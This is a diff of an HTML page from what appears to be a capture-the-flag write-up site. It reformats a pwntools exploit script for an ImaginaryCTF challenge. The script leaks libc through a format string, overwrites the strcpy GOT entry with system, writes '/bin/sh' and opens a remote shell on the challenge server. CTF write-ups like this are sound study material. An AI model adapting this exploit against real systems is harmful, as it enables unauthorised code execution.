@@ -67,69 +67,54 @@
 <div>
     <img src="../imgs/imaginary/write_2d.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
-from pwn import *
-elf = context.binary = ELF('./vuln')
-libc = elf.libc
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-local = False
+<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>
 
-if local:
-    p = elf.process()
-else:
-    host = 'chal.imaginaryctf.org'
-    port = 42005
-    p = remote(host,port)
+<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
+<span style="color: #859900">else</span><span style="color: #839496">:</span>
+    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'chal.imaginaryctf.org'</span>
+    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">42005</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>
 
-def arb_write(val,diff):
-    i = 0
-    for c in val:
-        p.sendline(str(diff + i))
-        p.sendline(p8(c))
-        i+=1
+<span style="color: #859900">def</span> <span style="color: #268bd2">arb_write</span><span style="color: #839496">(val,diff):</span>
+    <span style="color: #839496">i</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">0</span>
+    <span style="color: #859900">for</span> <span style="color: #839496">c</span> <span style="color: #859900">in</span> <span style="color: #839496">val:</span>
+        <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #268bd2">str</span><span style="color: #839496">(diff</span> <span style="color: #586e75">+</span> <span style="color: #839496">i))</span>
+        <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(p8(c))</span>
+        <span style="color: #839496">i</span><span style="color: #586e75">+=</span><span style="color: #2aa198">1</span>
 
-target = 0x601080
-strcpy = 0x601018
-diff = (strcpy - target)
+<span style="color: #839496">target</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">0x601080</span>
+<span style="color: #839496">strcpy</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">0x601018</span>
+<span style="color: #839496">diff</span> <span style="color: #586e75">=</span> <span style="color: #839496">(strcpy</span> <span style="color: #586e75">-</span> <span style="color: #839496">target)</span>
 
-leak_me = b"%13$p."
-binsh = b'/bin/sh\0'
+<span style="color: #839496">leak_me</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b"%13$p."</span>
+<span style="color: #839496">binsh</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'/bin/sh\0'</span>
 
-arb_write(p64(0x400600),diff)
-arb_write(leak_me,0)
+<span style="color: #839496">arb_write(p64(</span><span style="color: #2aa198">0x400600</span><span style="color: #839496">),diff)</span>
+<span style="color: #839496">arb_write(leak_me,</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span>
 
-p.sendline('15')
-p.sendline('2')
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'15'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
 
-p.recvuntil('Exit\n')
-data = p.recvuntil('.').strip()[:-1]
-libc.address = int(data,16) - 0x270b3
-system = p64(libc.sym.system)
-print("[+] Libc Address: " + hex(libc.address))
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'Exit\n'</span><span style="color: #839496">)</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'.'</span><span style="color: #839496">)</span><span style="color: #586e75">.</span><span style="color: #839496">strip()[:</span><span style="color: #586e75">-</span><span style="color: #2aa198">1</span><span style="color: #839496">]</span>
+<span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(data,</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span> <span style="color: #586e75">-</span> <span style="color: #2aa198">0x270b3</span>
+<span style="color: #839496">system</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">system)</span>
+<span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #2aa198">"[+] Libc Address: "</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">hex</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">address))</span>
 
-arb_write(binsh,0)
-arb_write(p64(libc.sym.system),diff)
+<span style="color: #839496">arb_write(binsh,</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span>
+<span style="color: #839496">arb_write(p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">system),diff)</span>
 
-p.sendline('15')
-p.sendline('2')
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'15'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
